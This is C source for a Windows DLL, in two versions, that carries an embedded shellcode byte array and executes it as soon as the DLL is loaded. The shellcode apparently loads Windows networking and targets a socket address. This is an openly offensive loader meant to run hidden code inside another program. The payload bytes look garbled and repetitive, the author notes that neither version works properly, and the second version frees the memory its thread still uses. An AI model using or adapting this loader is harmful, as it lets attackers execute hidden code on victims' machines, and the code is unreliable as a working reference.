#include <windows.h>

unsigned char shellcode[] = {
    0xFC, 0xE8, 0x8F, 0x00, 0x00, 0x00, 0x60, 0x31, 0xD2, 0x89,
    0xE5, 0x64, 0x8B, 0x52, 0x30, 0x8B, 0x52, 0x0C, 0x8B, 0x52,
    0x14, 0x0F, 0xB7, 0x4A, 0x26, 0x31, 0xFF, 0x8B, 0x72, 0x28,
    0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0xC1,
    0xCF, 0x0D, 0x01, 0xC7, 0xE2, 0xF2, 0x52, 0x57, 0x8B, 0x52,
    0x10, 0x8B, 0x42, 0x3C, 0x01, 0xD0, 0x8B, 0x40, 0x78, 0x85,
    0xC0, 0x74, 0x4A, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x8B,
    0x58, 0x20, 0x01, 0xD3, 0xE3, 0x3C, 0x49, 0x8B, 0x34, 0x8B,
    0x01, 0xD6, 0x31, 0xFF, 0x31, 0xC0, 0xAC, 0xC1, 0xCF, 0x0D,
    0x01, 0xC7, 0x38, 0xE0, 0x75, 0xF4, 0x03, 0x7D, 0xFC, 0x8B,
    0x58, 0x24, 0x01, 0xD3, 0x66, 0x8B, 0x0C, 0x4B, 0x8B, 0x58,
    0x1C, 0x01, 0xD3, 0x8B, 0x04, 0x8B, 0x01, 0xD0, 0x89, 0x44,
    0x24, 0x24, 0x5B, 0x5B, 0x61, 0x59, 0x5A, 0x51, 0xFF, 0xE0,
    0x5F, 0x5F, 0x5A, 0x8B, 0x12, 0xEB, 0x8D, 0x5D, 0x68, 0x33,
    0x32, 0x00, 0x00, 0x68, 0x77, 0x73, 0x32, 0x5F, 0x54, 0x68,
    0x4C, 0x77, 0x26, 0x07, 0xFF, 0xD5, 0x31, 0xDB, 0x53, 0x53,
    0x53, 0x53, 0x53, 0x68, 0x7F, 0x00, 0x00, 0x01, 0x89, 0xE0,
    0x41, 0xBB, 0x2B, 0x55, 0x34, 0x5F, 0xFF, 0xD5, 0x85, 0xC0,
    0x74, 0x4C, 0x01, 0xD0, 0x66, 0xC7, 0x44, 0x24, 0x0C, 0x01,
    0x00, 0x89, 0xE0, 0x41, 0xBB, 0x01, 0x32, 0x00, 0x00, 0x89,
    0xE1, 0x41, 0xBB, 0x58, 0x09, 0x8A, 0x16, 0x89, 0xE2, 0x31,
    0xDB, 0x83, 0x6D, 0x24, 0x04, 0x89, 0xE1, 0x31, 0xC0, 0x50,
    0x50, 0x50, 0x50, 0x40, 0x50, 0x40, 0x50, 0x68, 0xEB, 0x55,
    0x2E, 0x3B, 0xFF, 0xD5, 0x89, 0xC6, 0x31, 0xDB, 0x83, 0x6D,
    0x24, 0x04, 0x89, 0xE1, 0x31, 0xC0, 0x50, 0x68, 0x61, 0x72,
    0x74, 0x61, 0x68, 0x4C, 0x69, 0x6E, 0x6B, 0xFF, 0xD5, 0x85,
    0xDB, 0x75, 0x28, 0x68, 0x33, 0x32, 0x00, 0x00, 0x68, 0x77,
    0x73, 0x32, 0x5F, 0x54, 0x68, 0x4C, 0x77, 0x26, 0x07, 0xFF,
    0xD5, 0x83, 0x6D, 0x24, 0x10, 0x48, 0x89, 0xE1, 0x31, 0xD2,
    0x66, 0xC7, 0x44, 0x24, 0x0C, 0x02, 0x00, 0x01, 0x89, 0xE0,
    0x41, 0xBB, 0x01, 0x32, 0x00, 0x00, 0x89, 0xE1, 0x41, 0xBB,
    0x58, 0x09, 0x8A, 0x16, 0x89, 0xE2, 0x31, 0xDB, 0x83, 0x6D,
    0x24, 0x04, 0x89, 0xE1, 0x31, 0xC0, 0x50, 0x50, 0x50, 0x40,
    0x50, 0x40, 0x50, 0x68, 0xEB, 0x55, 0x2E, 0x3B, 0xFF, 0xD5,
    0x89, 0xC6, 0x31, 0xDB, 0x83, 0x6D, 0x24, 0x04, 0x89, 0xE1,
    0x31, 0xC0, 0x50, 0x68, 0x61, 0x72, 0x74, 0x61, 0x68, 0x4C,
    0x69, 0x6E, 0x6B, 0xFF, 0xD5, 0x85, 0xDB, 0x75, 0x28, 0x83,
    0x6D, 0x24, 0x10, 0x48, 0x8B, 0x3C, 0x24, 0x01, 0xD1, 0xFF,
    0xC9, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x01, 0xC1,
    0xE2, 0xED, 0x52, 0x41, 0x51, 0x52, 0x52, 0x4D, 0x31, 0xC0,
    0x0F, 0xB7, 0x0C, 0x4A, 0x45, 0x39, 0xCE, 0x74, 0x13, 0x41,
    0x51, 0x41, 0x51, 0x53, 0xFF, 0xD0, 0x83, 0xC4, 0x0C, 0x59,
    0x5A, 0x5A, 0x4D, 0x8B, 0x12, 0xEB, 0x76, 0x5E, 0x31, 0xFF,
    0x0F, 0xB7, 0x6A, 0x26, 0x8B, 0x45, 0x28, 0x50, 0x8B, 0x45,
    0x0C, 0x50, 0xFF, 0x75, 0x08, 0xFF, 0x55, 0x38, 0x8B, 0x4D,
    0x10, 0x8B, 0x55, 0x3C, 0x8B, 0x45, 0x08, 0x8B, 0x04, 0x88,
    0x01, 0xD0, 0x85, 0xC0, 0x74, 0x11, 0x8B, 0x4D, 0x38, 0x8B,
    0x55, 0x10, 0x8B, 0x45, 0x20, 0x01, 0xD0, 0x0F, 0xB7, 0x0C,
    0x4A, 0x8B, 0x55, 0x1C, 0x01, 0xD0, 0x8B, 0x04, 0x8A, 0x01,
    0xD0, 0x89, 0x44, 0x24, 0x24, 0x5B, 0x5B, 0x61, 0x59, 0x5A,
    0x51, 0xFF, 0xE0, 0x5F, 0x5F, 0x5A, 0x8B, 0x12, 0xEB, 0x5E,
    0x41, 0xBB, 0x46, 0x45, 0x7E, 0x7D, 0xFF, 0xD5, 0x31, 0xDB,
    0x53, 0x53, 0x53, 0x53, 0x53, 0x68, 0x3E, 0x00, 0x00, 0x00,
    0x89, 0xE0, 0x41, 0xBB, 0x6B, 0x59, 0x34, 0x5F, 0xFF, 0xD5,
    0x85, 0xC0, 0x74, 0x3E, 0x31, 0xDB, 0x83, 0x6D, 0x24, 0x10,
    0x48, 0x8B, 0x3C, 0x24, 0x01, 0xD1, 0xFF, 0xC9, 0x31, 0xC0,
    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x01, 0xC1, 0x38, 0xE0, 0x75,
    0xF4, 0x03, 0x7D, 0xFC, 0x8B, 0x54, 0x24, 0x10, 0x8B, 0x4A,
    0x3C, 0x8B, 0x4E, 0x78, 0x03, 0xCE, 0x8B, 0x4E, 0x20, 0x03,
    0xC7, 0x8B, 0x4E, 0x18, 0x83, 0xC7, 0x08, 0x8B, 0x36, 0x8B,
    0x56, 0x24, 0x03, 0xD3, 0x52, 0x8B, 0x57, 0x20, 0x03, 0xD3,
    0x50, 0x52, 0x57, 0xFF, 0xD0, 0x83, 0x6D, 0x24, 0x10, 0x48,
    0x89, 0xE1, 0x31, 0xD2, 0x66, 0xC7, 0x44, 0x24, 0x0C, 0x02,
    0x00, 0x01, 0x89, 0xE0, 0x41, 0xBB, 0x01, 0x32, 0x00, 0x00,
    0x89, 0xE1, 0x41, 0xBB, 0x58, 0x09, 0x8A, 0x16, 0x89, 0xE2,
    0x31, 0xDB, 0x83, 0x6D, 0x24, 0x04, 0x89, 0xE1, 0x31, 0xC0,
    0x50, 0x50, 0x50, 0x50, 0x40, 0x50, 0x40, 0x50, 0x68, 0xEB,
    0x55, 0x2E, 0x3B, 0xFF, 0xD5, 0x89, 0xC6, 0x31, 0xDB, 0x83,
    0x6D, 0x24, 0x04, 0x89, 0xE1, 0x31, 0xC0, 0x50, 0x68, 0x61,
    0x72, 0x74, 0x61, 0x68, 0x4C, 0x69, 0x6E, 0x6B, 0xFF, 0xD5,
    0x85, 0xDB, 0x75, 0x28, 0x68, 0x33, 0x32, 0x00, 0x00, 0x68,
    0x77, 0x73, 0x32, 0x5F, 0x54, 0x68, 0x4C, 0x77, 0x26, 0x07,
    0xFF, 0xD5, 0x83, 0x6D, 0x24, 0x10, 0x48, 0x8B, 0x3C, 0x24,
    0x01, 0xD1, 0xFF, 0xC9, 0x31, 0xC0, 0x50, 0x50, 0x50, 0x40,
    0x50, 0x40, 0x50, 0x68, 0xEB, 0x55, 0x2E, 0x3B, 0xFF, 0xD5,
    0x89, 0xC6, 0x31, 0xDB, 0x83, 0x6D, 0x24, 0x04, 0x89, 0xE1,
    0x31, 0xC0, 0x50, 0x68, 0x61, 0x72, 0x74, 0x61, 0x68, 0x4C,
    0x69, 0x6E, 0x6B, 0xFF, 0xD5, 0x85, 0xDB, 0x75, 0x28, 0x83,
    0x6D, 0x24, 0x10, 0x48, 0x8B, 0x3C, 0x24, 0x01, 0xD1, 0xFF,
    0xC9, 0x31, 0xC0, 0x50, 0x68, 0x61, 0x72, 0x74, 0x61, 0x68,
    0x4C, 0x69, 0x6E, 0x6B, 0xFF, 0xD5, 0x85, 0xDB, 0x75, 0x28,
    0x83, 0x6D, 0x24, 0x10, 0x48, 0x8B, 0x3C, 0x24, 0x01, 0xD1,
    0xFF, 0xC9, 0x31, 0xC0, 0x50, 0x68, 0x61, 0x72, 0x74, 0x61,
    0x68, 0x4C, 0x69, 0x6E, 0x6B, 0xFF, 0xD5, 0x8B, 0x47, 0x10,
    0xBA, 0xC6, 0xFF, 0xFF, 0xFF, 0x83, 0xE8, 0x01, 0x50, 0x68,
    0x33, 0x32, 0x00, 0x00, 0x68, 0x77, 0x73, 0x32, 0x5F, 0x54,
    0x68, 0x4C, 0x77, 0x26, 0x07, 0xFF, 0xD5, 0x8B, 0xD0, 0x83,
    0xC0, 0x40, 0x68, 0x91, 0x68, 0x00, 0x00, 0x52, 0x68, 0x2D,
    0x06, 0x18, 0x7B, 0xFF, 0xD5, 0x85, 0xC0, 0x74, 0x10, 0x68,
    0x0A, 0x00, 0x00, 0x00, 0x6A, 0x05, 0x41, 0x83, 0xCC, 0x04,
    0x89, 0xE0, 0x85, 0xC0, 0x75, 0xCB, 0x83, 0x4C, 0x24, 0x08,
    0x01, 0x31, 0xFF, 0x0F, 0xB7, 0x0C, 0x4A, 0x4D, 0x31, 0xC9,
    0x41, 0x51, 0x89, 0xC8, 0xFF, 0xC0, 0xC1, 0xC8, 0x0D, 0x01,
    0xC1, 0xE2, 0xED, 0x51, 0x51, 0x51, 0x41, 0x51, 0x49, 0xBB,
    0x58, 0x2D, 0x3B, 0x8F, 0xFF, 0xD5, 0x85, 0xDB, 0x75, 0x1A,
    0x68, 0x33, 0x32, 0x00, 0x00, 0x68, 0x77, 0x73, 0x32, 0x5F,
    0x54, 0x68, 0x4C, 0x77, 0x26, 0x07, 0xFF, 0xD5, 0x83, 0x6D,
    0x24, 0x10, 0x48, 0x8B, 0x3C, 0x24, 0x01, 0xD1, 0xFF, 0xC9,
    0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x01, 0xC1, 0xE2,
    0xED, 0x52, 0x41, 0x51, 0x8B, 0x45, 0x08, 0x31, 0xC0, 0x50,
    0x68, 0x61, 0x72, 0x74, 0x61, 0x68, 0x4C, 0x69, 0x6E, 0x6B,
    0xFF, 0xD5, 0x85, 0xC0, 0x74, 0x0B, 0x55, 0x6A, 0x00, 0xFF,
    0xE0, 0x6A, 0x00, 0x6A, 0x00, 0xFF, 0xE0
};


// Define a function pointer type for the shellcode
typedef unsigned char (*ShellcodeFunction)();

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
    {
        // Create a function pointer to the shellcode
        ShellcodeFunction executeShellcode = (ShellcodeFunction)shellcode;

        // Execute the shellcode
        executeShellcode();
    }
    return TRUE;
}


#####V1 currently not working#####




#include <Windows.h>

unsigned char shellcode[] = {
    0xFC, 0xE8, 0x8F, 0x00, 0x00, 0x00, 0x60, 0x31, 0xD2, 0x89,
    0xE5, 0x64, 0x8B, 0x52, 0x30, 0x8B, 0x52, 0x0C, 0x8B, 0x52,
    0x14, 0x0F, 0xB7, 0x4A, 0x26, 0x31, 0xFF, 0x8B, 0x72, 0x28,
    0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0xC1,
    0xCF, 0x0D, 0x01, 0xC7, 0xE2, 0xF2, 0x52, 0x57, 0x8B, 0x52,
    0x10, 0x8B, 0x42, 0x3C, 0x01, 0xD0, 0x8B, 0x40, 0x78, 0x85,
    0xC0, 0x74, 0x4A, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x8B,
    0x58, 0x20, 0x01, 0xD3, 0xE3, 0x3C, 0x49, 0x8B, 0x34, 0x8B,
    0x01, 0xD6, 0x31, 0xFF, 0x31, 0xC0, 0xAC, 0xC1, 0xCF, 0x0D,
    0x01, 0xC7, 0x38, 0xE0, 0x75, 0xF4, 0x03, 0x7D, 0xFC, 0x8B,
    0x58, 0x24, 0x01, 0xD3, 0x66, 0x8B, 0x0C, 0x4B, 0x8B, 0x58,
    0x1C, 0x01, 0xD3, 0x8B, 0x04, 0x8B, 0x01, 0xD0, 0x89, 0x44,
    0x24, 0x24, 0x5B, 0x5B, 0x61, 0x59, 0x5A, 0x51, 0xFF, 0xE0,
    0x5F, 0x5F, 0x5A, 0x8B, 0x12, 0xEB, 0x8D, 0x5D, 0x68, 0x33,
    0x32, 0x00, 0x00, 0x68, 0x77, 0x73, 0x32, 0x5F, 0x54, 0x68,
    0x4C, 0x77, 0x26, 0x07, 0xFF, 0xD5, 0x31, 0xDB, 0x53, 0x53,
    0x53, 0x53, 0x53, 0x68, 0x7F, 0x00, 0x00, 0x01, 0x89, 0xE0,
    0x41, 0xBB, 0x2B, 0x55, 0x34, 0x5F, 0xFF, 0xD5, 0x85, 0xC0,
    0x74, 0x4C, 0x01, 0xD0, 0x66, 0xC7, 0x44, 0x24, 0x0C, 0x01,
    0x00, 0x89, 0xE0, 0x41, 0xBB, 0x01, 0x32, 0x00, 0x00, 0x89,
    0xE1, 0x41, 0xBB, 0x58, 0x09, 0x8A, 0x16, 0x89, 0xE2, 0x31,
    0xDB, 0x83, 0x6D, 0x24, 0x04, 0x89, 0xE1, 0x31, 0xC0, 0x50,
    0x50, 0x50, 0x50, 0x40, 0x50, 0x40, 0x50, 0x68, 0xEB, 0x55,
    0x2E, 0x3B, 0xFF, 0xD5, 0x89, 0xC6, 0x31, 0xDB, 0x83, 0x6D,
    0x24, 0x04, 0x89, 0xE1, 0x31, 0xC0, 0x50, 0x68, 0x61, 0x72,
    0x74, 0x61, 0x68, 0x4C, 0x69, 0x6E, 0x6B, 0xFF, 0xD5, 0x85,
    0xDB, 0x75, 0x28, 0x68, 0x33, 0x32, 0x00, 0x00, 0x68, 0x77,
    0x73, 0x32, 0x5F, 0x54, 0x68, 0x4C, 0x77, 0x26, 0x07, 0xFF,
    0xD5, 0x83, 0x6D, 0x24, 0x10, 0x48, 0x89, 0xE1, 0x31, 0xD2,
    0x66, 0xC7, 0x44, 0x24, 0x0C, 0x02, 0x00, 0x01, 0x89, 0xE0,
    0x41, 0xBB, 0x01, 0x32, 0x00, 0x00, 0x89, 0xE1, 0x41, 0xBB,
    0x58, 0x09, 0x8A, 0x16, 0x89, 0xE2, 0x31, 0xDB, 0x83, 0x6D,
    0x24, 0x04, 0x89, 0xE1, 0x31, 0xC0, 0x50, 0x50, 0x50, 0x40,
    0x50, 0x40, 0x50, 0x68, 0xEB, 0x55, 0x2E, 0x3B, 0xFF, 0xD5,
    0x89, 0xC6, 0x31, 0xDB, 0x83, 0x6D, 0x24, 0x04, 0x89, 0xE1,
    0x31, 0xC0, 0x50, 0x68, 0x61, 0x72, 0x74, 0x61, 0x68, 0x4C,
    0x69, 0x6E, 0x6B, 0xFF, 0xD5, 0x85, 0xDB, 0x75, 0x28, 0x83,
    0x6D, 0x24, 0x10, 0x48, 0x8B, 0x3C, 0x24, 0x01, 0xD1, 0xFF,
    0xC9, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x01, 0xC1,
    0xE2, 0xED, 0x52, 0x41, 0x51, 0x52, 0x52, 0x4D, 0x31, 0xC0,
    0x0F, 0xB7, 0x0C, 0x4A, 0x45, 0x39, 0xCE, 0x74, 0x13, 0x41,
    0x51, 0x41, 0x51, 0x53, 0xFF, 0xD0, 0x83, 0xC4, 0x0C, 0x59,
    0x5A, 0x5A, 0x4D, 0x8B, 0x12, 0xEB, 0x76, 0x5E, 0x31, 0xFF,
    0x0F, 0xB7, 0x6A, 0x26, 0x8B, 0x45, 0x28, 0x50, 0x8B, 0x45,
    0x0C, 0x50, 0xFF, 0x75, 0x08, 0xFF, 0x55, 0x38, 0x8B, 0x4D,
    0x10, 0x8B, 0x55, 0x3C, 0x8B, 0x45, 0x08, 0x8B, 0x04, 0x88,
    0x01, 0xD0, 0x85, 0xC0, 0x74, 0x11, 0x8B, 0x4D, 0x38, 0x8B,
    0x55, 0x10, 0x8B, 0x45, 0x20, 0x01, 0xD0, 0x0F, 0xB7, 0x0C,
    0x4A, 0x8B, 0x55, 0x1C, 0x01, 0xD0, 0x8B, 0x04, 0x8A, 0x01,
    0xD0, 0x89, 0x44, 0x24, 0x24, 0x5B, 0x5B, 0x61, 0x59, 0x5A,
    0x51, 0xFF, 0xE0, 0x5F, 0x5F, 0x5A, 0x8B, 0x12, 0xEB, 0x5E,
    0x41, 0xBB, 0x46, 0x45, 0x7E, 0x7D, 0xFF, 0xD5, 0x31, 0xDB,
    0x53, 0x53, 0x53, 0x53, 0x53, 0x68, 0x3E, 0x00, 0x00, 0x00,
    0x89, 0xE0, 0x41, 0xBB, 0x6B, 0x59, 0x34, 0x5F, 0xFF, 0xD5,
    0x85, 0xC0, 0x74, 0x3E, 0x31, 0xDB, 0x83, 0x6D, 0x24, 0x10,
    0x48, 0x8B, 0x3C, 0x24, 0x01, 0xD1, 0xFF, 0xC9, 0x31, 0xC0,
    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x01, 0xC1, 0x38, 0xE0, 0x75,
    0xF4, 0x03, 0x7D, 0xFC, 0x8B, 0x54, 0x24, 0x10, 0x8B, 0x4A,
    0x3C, 0x8B, 0x4E, 0x78, 0x03, 0xCE, 0x8B, 0x4E, 0x20, 0x03,
    0xC7, 0x8B, 0x4E, 0x18, 0x83, 0xC7, 0x08, 0x8B, 0x36, 0x8B,
    0x56, 0x24, 0x03, 0xD3, 0x52, 0x8B, 0x57, 0x20, 0x03, 0xD3,
    0x50, 0x52, 0x57, 0xFF, 0xD0, 0x83, 0x6D, 0x24, 0x10, 0x48,
    0x89, 0xE1, 0x31, 0xD2, 0x66, 0xC7, 0x44, 0x24, 0x0C, 0x02,
    0x00, 0x01, 0x89, 0xE0, 0x41, 0xBB, 0x01, 0x32, 0x00, 0x00,
    0x89, 0xE1, 0x41, 0xBB, 0x58, 0x09, 0x8A, 0x16, 0x89, 0xE2,
    0x31, 0xDB, 0x83, 0x6D, 0x24, 0x04, 0x89, 0xE1, 0x31, 0xC0,
    0x50, 0x50, 0x50, 0x50, 0x40, 0x50, 0x40, 0x50, 0x68, 0xEB,
    0x55, 0x2E, 0x3B, 0xFF, 0xD5, 0x89, 0xC6, 0x31, 0xDB, 0x83,
    0x6D, 0x24, 0x04, 0x89, 0xE1, 0x31, 0xC0, 0x50, 0x68, 0x61,
    0x72, 0x74, 0x61, 0x68, 0x4C, 0x69, 0x6E, 0x6B, 0xFF, 0xD5,
    0x85, 0xDB, 0x75, 0x28, 0x68, 0x33, 0x32, 0x00, 0x00, 0x68,
    0x77, 0x73, 0x32, 0x5F, 0x54, 0x68, 0x4C, 0x77, 0x26, 0x07,
    0xFF, 0xD5, 0x83, 0x6D, 0x24, 0x10, 0x48, 0x8B, 0x3C, 0x24,
    0x01, 0xD1, 0xFF, 0xC9, 0x31, 0xC0, 0x50, 0x50, 0x50, 0x40,
    0x50, 0x40, 0x50, 0x68, 0xEB, 0x55, 0x2E, 0x3B, 0xFF, 0xD5,
    0x89, 0xC6, 0x31, 0xDB, 0x83, 0x6D, 0x24, 0x04, 0x89, 0xE1,
    0x31, 0xC0, 0x50, 0x68, 0x61, 0x72, 0x74, 0x61, 0x68, 0x4C,
    0x69, 0x6E, 0x6B, 0xFF, 0xD5, 0x85, 0xDB, 0x75, 0x28, 0x83,
    0x6D, 0x24, 0x10, 0x48, 0x8B, 0x3C, 0x24, 0x01, 0xD1, 0xFF,
    0xC9, 0x31, 0xC0, 0x50, 0x68, 0x61, 0x72, 0x74, 0x61, 0x68,
    0x4C, 0x69, 0x6E, 0x6B, 0xFF, 0xD5, 0x85, 0xDB, 0x75, 0x28,
    0x83, 0x6D, 0x24, 0x10, 0x48, 0x8B, 0x3C, 0x24, 0x01, 0xD1,
    0xFF, 0xC9, 0x31, 0xC0, 0x50, 0x68, 0x61, 0x72, 0x74, 0x61,
    0x68, 0x4C, 0x69, 0x6E, 0x6B, 0xFF, 0xD5, 0x8B, 0x47, 0x10,
    0xBA, 0xC6, 0xFF, 0xFF, 0xFF, 0x83, 0xE8, 0x01, 0x50, 0x68,
    0x33, 0x32, 0x00, 0x00, 0x68, 0x77, 0x73, 0x32, 0x5F, 0x54,
    0x68, 0x4C, 0x77, 0x26, 0x07, 0xFF, 0xD5, 0x8B, 0xD0, 0x83,
    0xC0, 0x40, 0x68, 0x91, 0x68, 0x00, 0x00, 0x52, 0x68, 0x2D,
    0x06, 0x18, 0x7B, 0xFF, 0xD5, 0x85, 0xC0, 0x74, 0x10, 0x68,
    0x0A, 0x00, 0x00, 0x00, 0x6A, 0x05, 0x41, 0x83, 0xCC, 0x04,
    0x89, 0xE0, 0x85, 0xC0, 0x75, 0xCB, 0x83, 0x4C, 0x24, 0x08,
    0x01, 0x31, 0xFF, 0x0F, 0xB7, 0x0C, 0x4A, 0x4D, 0x31, 0xC9,
    0x41, 0x51, 0x89, 0xC8, 0xFF, 0xC0, 0xC1, 0xC8, 0x0D, 0x01,
    0xC1, 0xE2, 0xED, 0x51, 0x51, 0x51, 0x41, 0x51, 0x49, 0xBB,
    0x58, 0x2D, 0x3B, 0x8F, 0xFF, 0xD5, 0x85, 0xDB, 0x75, 0x1A,
    0x68, 0x33, 0x32, 0x00, 0x00, 0x68, 0x77, 0x73, 0x32, 0x5F,
    0x54, 0x68, 0x4C, 0x77, 0x26, 0x07, 0xFF, 0xD5, 0x83, 0x6D,
    0x24, 0x10, 0x48, 0x8B, 0x3C, 0x24, 0x01, 0xD1, 0xFF, 0xC9,
    0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x01, 0xC1, 0xE2,
    0xED, 0x52, 0x41, 0x51, 0x8B, 0x45, 0x08, 0x31, 0xC0, 0x50,
    0x68, 0x61, 0x72, 0x74, 0x61, 0x68, 0x4C, 0x69, 0x6E, 0x6B,
    0xFF, 0xD5, 0x85, 0xC0, 0x74, 0x0B, 0x55, 0x6A, 0x00, 0xFF,
    0xE0, 0x6A, 0x00, 0x6A, 0x00, 0xFF, 0xE0
};

DWORD WINAPI ShellcodeThread(LPVOID lpParameter)
{
    // Cast the parameter to a function pointer
    void (*executeShellcode)() = (void (*)())lpParameter;

    // Execute the shellcode
    executeShellcode();

    // You can add any cleanup or additional code here if needed

    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
    {
        // Allocate memory for the shellcode
        LPVOID shellcodeMemory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        if (shellcodeMemory)
        {
            // Copy the shellcode to the allocated memory
            memcpy(shellcodeMemory, shellcode, sizeof(shellcode));

            // Create a thread to execute the shellcode
            HANDLE threadHandle = CreateThread(NULL, 0, ShellcodeThread, shellcodeMemory, 0, NULL);

            if (threadHandle)
            {
                // Optionally, you can wait for the thread to finish execution
                // WaitForSingleObject(threadHandle, INFINITE);

                // Close the thread handle
                CloseHandle(threadHandle);
            }

            // Free the allocated memory
            VirtualFree(shellcodeMemory, 0, MEM_RELEASE);
        }
    }

    return TRUE;
}


####### Compiles but breaks the application ######





